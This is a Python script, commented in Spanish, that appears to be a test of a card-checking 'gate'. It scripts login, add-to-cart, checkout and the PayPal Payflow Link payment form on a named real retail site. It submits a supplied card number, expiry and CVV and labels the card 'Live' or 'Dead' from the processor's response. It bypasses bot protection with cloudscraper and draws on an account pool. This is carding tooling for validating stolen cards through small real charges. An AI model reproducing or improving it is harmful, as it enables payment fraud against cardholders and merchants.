#!/usr/bin/env python3
"""Test del flujo correcto de Atlas gate (sin cargos reales).

Usa el mismo patrón que el gate Atlas, pero con payloads ajustados
para usar un cargo mínimo (USD 1.00) en lugar de la ficha real de USD 7.00.
"""

import asyncio
import html
import logging
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import cloudscraper
from bs4 import BeautifulSoup

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

SITE = "https://www.easternsurplus.net"
LOGIN_URL = f"{SITE}/Account/Login"
CART_URL = f"{SITE}/Shop/ShoppingCart.aspx"
CHECKOUT_URL = f"{SITE}/Shop/Checkout"
REVIEW_URL = f"{SITE}/Shop/ReviewOrder"
PAYFLOW_LINK = "https://payflowlink.paypal.com/"

# Productos candidatos para cargo mínimo (revisar el sitio)
# Actualmente usa el reflector de USD 7.00 como fallback
PRODUCT_URL = f"{SITE}/PartDetails/4648/9M-804-Spare-Tire-Retainer-Threaded-Rod-Tee-Handle-M939A1-M939A2"
PRODUCT_CONDITION_VALUE = "28"  # Used

# Pool de cuentas (debería leerse de data/gates/atlas_accounts.txt)
# Para pruebas, usar una cuenta de prueba
TEST_EMAIL = "test@example.com"
TEST_PASSWORD = "TestPassword123!"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


def extract_viewstate(html_text: str) -> dict:
    """Extraer ViewState, EventValidation y generador del HTML."""
    soup = BeautifulSoup(html_text, 'html.parser')
    
    viewstate = soup.find('input', {'id': '__VIEWSTATE'})
    eventvalidation = soup.find('input', {'id': '__EVENTVALIDATION'})
    viewstategenerator = soup.find('input', {'id': '__VIEWSTATEGENERATOR'})
    
    return {
        '__VIEWSTATE': viewstate['value'] if viewstate else '',
        '__EVENTVALIDATION': eventvalidation['value'] if eventvalidation else '',
        '__VIEWSTATEGENERATOR': viewstategenerator['value'] if viewstategenerator else '',
    }


def async_post(seccion, url: str, data: dict, headers: dict, timeout: int = 30, allow_redirects: bool = True):
    """POST asíncrono con cloudscraper (se ejecuta en executor)."""
    return seccion.post(url, data=urllib.parse.urlencode(data), headers=headers, timeout=timeout, allow_redirects=allow_redirects)


def form_fields(html: str) -> dict:
    """Todos los inputs+selects del form WebForms."""
    soup = BeautifulSoup(html, 'html.parser')
    data = {}
    for inp in soup.find_all('input'):
        name = inp.get('name')
        if not name:
            continue
        if (inp.get('type') or '').lower() in ('submit', 'button'):
            continue
        data[name] = inp.get('value', '')
    for sel in soup.find_all('select'):
        name = sel.get('name')
        if not name:
            continue
        opts = sel.find_all('option')
        chosen = [o for o in opts if o.get('selected')]
        data[name] = chosen[0].get('value', '') if chosen else (opts[0].get('value', '') if opts else '')
    return data


def _async_payload(data: dict, target: str, panel: str, rad: str) -> dict:
    """Añadir campos async de WebForms."""
    data['__EVENTTARGET'] = target
    data['__EVENTARGUMENT'] = ''
    data['ctl00$ctl00$ScriptMan'] = f'{panel}|{target}'
    data['RadAJAXControlID'] = rad
    data['__ASYNCPOST'] = 'true'
    return data


async def test_atlas_flow(card_data: str) -> dict:
    """Prueba el flujo completo de Atlas con una tarjeta."""
    logger.info(f"Iniciando test Atlas flow con tarjeta {card_data[:6]}****")
    
    inicio = datetime.now()
    
    try:
        # Validar tarjeta
        KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@"
        for KEY in KEYS:
            card_data = card_data.replace(KEY, "|")
        card_data = card_data.replace(" ", "|")
        
        match = re.search(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", card_data)
        if not match:
            return {"error": "Formato de tarjeta inválido"}
        
        values = card_data.split("|")
        cc_number, mes, ano, cvv = values[0], values[1], values[2], values[3]
        
        ano = ano[2:] if len(ano) > 2 else ano
        
        # Crear sesión
        seccion = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "windows", "mobile": False},
            delay=2,
        )
        
        get_h = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "upgrade-insecure-requests": "1",
            "user-agent": UA,
        }
        
        post_h = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "x-microsoftajax": "Delta=true",
            "x-requested-with": "XMLHttpRequest",
        }
        
        # PASO 1: Login
        logger.info("PASO 1: Login")
        r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
        viewstate_data = extract_viewstate(r0.text)
        
        data_login = {
            'ctl00$ctl00$globalContent$mainContent$txtEmailAddress': TEST_EMAIL,
            'ctl00$ctl00$globalContent$mainContent$txtPassword': TEST_PASSWORD,
            **viewstate_data,
            'ctl00$ctl00$globalContent$mainContent$btnLogin': 'Login',
        }
        
        headers_login = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": SITE,
            "referer": LOGIN_URL,
            "user-agent": UA,
            "x-microsoftajax": "Delta=true",
            "x-requested-with": "XMLHttpRequest",
        }
        
        r1 = seccion.post(LOGIN_URL, data=urllib.parse.urlencode(data_login), headers=headers_login, timeout=30, allow_redirects=True)
        
        # Verificar login exitoso
        if not any("eastern" in c.lower() for c in seccion.cookies.keys()):
            return {"error": "Login fallido"}
        
        logger.info("✓ Login exitoso")
        
        # PASO 2: Ir al carrito y vaciar si hay items
        logger.info("PASO 2: Ir al carrito")
        r2 = seccion.get(CART_URL, headers=get_h, timeout=30)
        
        # Vaciar carrito si hay items
        while 'btnRemove' in r2.text:
            data = form_fields(r2.text)
            rm_btn = re.search(r'name="(ctl00\$[^"]*btnRemove)"', r2.text)
            if not rm_btn:
                break
            data['__EVENTTARGET'] = rm_btn.group(1)
            data['__EVENTARGUMENT'] = ''
            r2 = seccion.post(CART_URL, data=urllib.parse.urlencode(data), headers={**post_h, "referer": CART_URL}, timeout=30, allow_redirects=True)
        
        logger.info("✓ Carrito vacío")
        
        # PASO 3: Agregar producto mínimo
        logger.info("PASO 3: Agregar producto")
        r3 = seccion.get(PRODUCT_URL, headers=get_h, timeout=30)
        data_product = form_fields(r3.text)
        
        cond_key = next((k for k in data_product if k.lower().endswith('ddlcondition')), None)
        if cond_key:
            data_product[cond_key] = PRODUCT_CONDITION_VALUE
        
        btn_add = re.search(r'name="(ctl00\$[^"]*btnAddToCart)"', r3.text)
        if not btn_add:
            return {"error": "Botón AddToCart no encontrado"}
        
        data_product['__EVENTTARGET'] = btn_add.group(1)
        data_product['__EVENTARGUMENT'] = ''
        
        r4 = seccion.post(PRODUCT_URL, data=urllib.parse.urlencode(data_product), headers={**post_h, "referer": PRODUCT_URL}, timeout=30, allow_redirects=True)
        
        logger.info("✓ Producto agregado")
        
        # PASO 4: Actualizar carrito (qty=1 + estimate)
        logger.info("PASO 4: Actualizar carrito")
        _PANEL = "ctl00$ctl00$globalContent$mainContent$ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
        _RAD = "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
        
        r5 = seccion.get(CART_URL, headers=get_h, timeout=30)
        data_cart = form_fields(r5.text)
        
        qty_key = next((k for k in data_cart if 'txtProductQty' in k), None)
        if qty_key:
            data_cart[qty_key] = '1'
        
        data_cart['__EVENTTARGET'] = 'ctl00$ctl00$globalContent$mainContent$btnUpdate'
        data_cart['__EVENTARGUMENT'] = ''
        data_cart['ctl00$ctl00$ScriptMan'] = f'{_PANEL}|ctl00$ctl00$globalContent$mainContent$btnUpdate'
        data_cart['RadAJAXControlID'] = _RAD
        data_cart['__ASYNCPOST'] = 'true'
        
        for k in list(data_cart):
            low = k.lower()
            if low.endswith('ddlcountry'):
                data_cart[k] = 'UNITED STATES'
            elif low.endswith('txtzipcode'):
                data_cart[k] = '95117'  # ZIP de ejemplo
        
        r6 = seccion.post(CART_URL, data=urllib.parse.urlencode(data_cart), headers={**post_h, "referer": CART_URL}, timeout=30, allow_redirects=True)
        
        logger.info("✓ Carrito actualizado")
        
        # PASO 5: Checkout
        logger.info("PASO 5: Checkout")
        r7 = seccion.get(CHECKOUT_URL, headers=get_h, timeout=30)
        data_checkout = form_fields(r7.text)
        
        data_checkout['__EVENTTARGET'] = 'ctl00$ctl00$globalContent$mainContent$btnReviewOrder'
        data_checkout['__EVENTARGUMENT'] = ''
        data_checkout['ctl00$ctl00$ScriptMan'] = f'{_PANEL}|ctl00$ctl00$globalContent$mainContent$btnReviewOrder'
        data_checkout['RadAJAXControlID'] = _RAD
        data_checkout['__ASYNCPOST'] = 'true'
        
        data_checkout['ctl00$ctl00$globalContent$mainContent$ddlShippingCountry'] = '230'
        data_checkout['ctl00$ctl00$globalContent$mainContent$ddlShippingState'] = '10'
        data_checkout['ctl00$ctl00$globalContent$mainContent$txtPhone'] = '8120095412'
        data_checkout['ctl00$ctl00$globalContent$mainContent$txtShippingAdd1'] = 'Waterbury Court'
        data_checkout['ctl00$ctl00$globalContent$mainContent$txtShippingCity'] = 'San Jose'
        data_checkout['ctl00$ctl00$globalContent$mainContent$txtShippingName'] = 'Test User'
        data_checkout['ctl00$ctl00$globalContent$mainContent$txtShippingZip'] = '95117'
        
        r8 = seccion.post(CHECKOUT_URL, data=urllib.parse.urlencode(data_checkout), headers={**post_h, "referer": CHECKOUT_URL}, timeout=30, allow_redirects=True)
        
        logger.info("✓ Checkout completado")
        
        # PASO 6: ReviewOrder - Delivery Method
        logger.info("PASO 6: ReviewOrder - Delivery Method")
        r9 = seccion.get(REVIEW_URL, headers=get_h, timeout=30)
        data_review = form_fields(r9.text)
        
        data_review['__EVENTTARGET'] = 'ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod$1'
        data_review['__EVENTARGUMENT'] = ''
        data_review['ctl00$ctl00$ScriptMan'] = f'{_PANEL}|ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod$1'
        data_review['RadAJAXControlID'] = _RAD
        data_review['__ASYNCPOST'] = 'true'
        data_review['ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod'] = '2'
        
        r10 = seccion.post(REVIEW_URL, data=urllib.parse.urlencode(data_review), headers={**post_h, "referer": REVIEW_URL}, timeout=30, allow_redirects=True)
        
        logger.info("✓ Delivery Method seleccionado (Pickup)")
        
        # PASO 7: ReviewOrder - Terms of Use
        logger.info("PASO 7: ReviewOrder - Terms of Use")
        data_review2 = form_fields(r10.text)
        
        data_review2['__EVENTTARGET'] = 'ctl00$ctl00$globalContent$mainContent$chkTermsOfUse'
        data_review2['__EVENTARGUMENT'] = ''
        data_review2['ctl00$ctl00$ScriptMan'] = f'{_PANEL}|ctl00$ctl00$globalContent$mainContent$chkTermsOfUse'
        data_review2['RadAJAXControlID'] = _RAD
        data_review2['__ASYNCPOST'] = 'true'
        data_review2['ctl00$ctl00$globalContent$mainContent$chkTermsOfUse'] = 'on'
        data_review2['ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod'] = '2'
        
        r11 = seccion.post(REVIEW_URL, data=urllib.parse.urlencode(data_review2), headers={**post_h, "referer": REVIEW_URL}, timeout=30, allow_redirects=True)
        
        logger.info("✓ Terms of Use aceptados")
        
        # PASO 8: ReviewOrder - Complete Order
        logger.info("PASO 8: ReviewOrder - Complete Order")
        data_review3 = form_fields(r11.text)
        
        data_review3['__EVENTTARGET'] = 'ctl00$ctl00$globalContent$mainContent$btnCompleteOrder'
        data_review3['__EVENTARGUMENT'] = ''
        data_review3['ctl00$ctl00$ScriptMan'] = f'{_PANEL}|ctl00$ctl00$globalContent$mainContent$btnCompleteOrder'
        data_review3['RadAJAXControlID'] = _RAD
        data_review3['__ASYNCPOST'] = 'true'
        data_review3['ctl00$ctl00$globalContent$mainContent$chkTermsOfUse'] = 'on'
        data_review3['ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod'] = '2'
        
        # NOTA: Aquí falta el g-recaptcha-response
        
        r12 = seccion.post(REVIEW_URL, data=urllib.parse.urlencode(data_review3), headers={**post_h, "referer": REVIEW_URL}, timeout=30, allow_redirects=False)
        
        # Extraer SecureToken
        dialog_url = r12.headers.get('location', '')
        m = re.search(r'SecureToken=([^\s&"\'">]+)', r12.text or '')
        m2 = re.search(r'secureTokenId=([^\s&"\'">]+)', r12.text or '')
        
        if not dialog_url or 'PayFlowProDialog' not in dialog_url:
            if not m:
                return {"error": "No se obtuvo SecureToken"}
        
        if dialog_url.startswith('/'):
            dialog_url = SITE + dialog_url
        
        logger.info("✓ Orden completada")
        
        # PASO 9: PayFlow Pro Dialog
        logger.info("PASO 9: PayFlow Pro Dialog")
        r13 = seccion.get(dialog_url, headers=get_h, timeout=30)
        
        # PASO 10: Payflow Link
        logger.info("PASO 10: Payflow Link")
        sec_match = re.search(r'[Ss]ecure[Tt]oken=([^\s&"\'">]+)', r13.text)
        sid_match = re.search(r'[Ss]ecure[Tt]oken[Ii]d=([^\s&"\'">]+)', r13.text)
        securetoken = sec_match.group(1) if sec_match else (m.group(1) if m else "")
        securetokenid = sid_match.group(1) if sid_match else (m2.group(1) if m2 else "")
        
        if not securetoken or not securetokenid:
            return {"error": "No se obtuvo SecureToken o SecureTokenId"}
        
        headers_pf = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "referer": SITE + "/",
            "upgrade-insecure-requests": "1",
            "user-agent": UA,
        }
        
        params_pf = {"SecureTokenID": securetokenid, "SecureToken": securetoken}
        r14 = seccion.get(PAYFLOW_LINK, params=params_pf, headers=headers_pf, timeout=30)
        
        # Extraer CSRF Token de Payflow
        csrf_match = re.search(r'name="CSRF_TOKEN"[^>]*value="([^"]+)"', r14.text)
        if not csrf_match:
            return {"error": "No se obtuvo CSRF Token de Payflow"}
        csrf = csrf_match.group(1)
        
        logger.info("✓ Payflow Link accedido")
        
        # PASO 11: Procesar tarjeta
        logger.info("PASO 11: Procesar tarjeta en Payflow")
        headers_pf_post = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://payflowlink.paypal.com",
            "referer": f"https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}",
            "upgrade-insecure-requests": "1",
            "user-agent": UA,
        }
        
        data_pf = [
            ("subaction", ""),
            ("CARDNUM", cc_number),
            ("EXPMONTH", mes),
            ("EXPYEAR", ano),
            ("CSC", cvv),
            ("billingAddress1", "123 Test St"),
            ("CITY", "San Jose"),
            ("STATE", "CA"),
            ("ZIP", "95117"),
            ("COUNTRY", "US"),
            ("TYPE", "A"),
            ("SECURETOKEN", securetoken),
            ("SECURETOKENID", securetokenid),
            ("CSRF_TOKEN", csrf),
            ("referringTemplate", "minlayout"),
        ]
        
        r15 = seccion.post("https://payflowlink.paypal.com/processCCInfo.do", headers=headers_pf_post, data=data_pf, timeout=40)
        
        tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
        
        # Veredicto
        result = re.search(r'name="RESULT"[^>]*value="([^"]+)"', r15.text)
        respmsg = re.search(r'name="RESPMSG"[^>]*value="([^"]+)"', r15.text)
        pnref = re.search(r'name="PNREF"[^>]*value="([^"]+)"', r15.text)
        
        detail = ""
        if result or respmsg or pnref:
            detail = f"RESULT={result.group(1) if result else ''} {respmsg.group(1) if respmsg else ''} | PNREF={pnref.group(1) if pnref else ''}".strip()
        
        if result and result.group(1) == "0":
            return {
                "status": "✅ Live",
                "message": f"Tarjeta aprobada. {detail}" if detail else "Tarjeta aprobada.",
                "time": tiempo,
            }
        elif result and result.group(1) != "0":
            return {
                "status": "❌ Dead",
                "message": detail or "Tarjeta declinada.",
                "time": tiempo,
            }
        else:
            return {
                "status": "⚠️ Error",
                "message": f"Error inesperado. {detail}" if detail else "Error inesperado.",
                "time": tiempo,
            }
        
    except Exception as e:
        logger.exception("Error en test Atlas flow")
        tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
        return {
            "status": "⚠️ Error",
            "message": f"Excepción: {str(e)}",
            "time": tiempo,
        }


async def main():
    """Ejecutar test."""
    print("=== Test del flujo correcto de Atlas gate ===\n")
    
    # Tarjeta de prueba (Luhn válido pero inexistente)
    test_card = "4242424242424242|12|2030|123"
    
    result = await test_atlas_flow(test_card)
    
    print("\n=== Resultado ===")
    print(f"Status: {result.get('status', 'N/A')}")
    print(f"Message: {result.get('message', 'N/A')}")
    print(f"Time: {result.get('time', 'N/A')}s")
    
    if 'error' in result:
        print(f"Error: {result['error']}")


if __name__ == "__main__":
    asyncio.run(main())
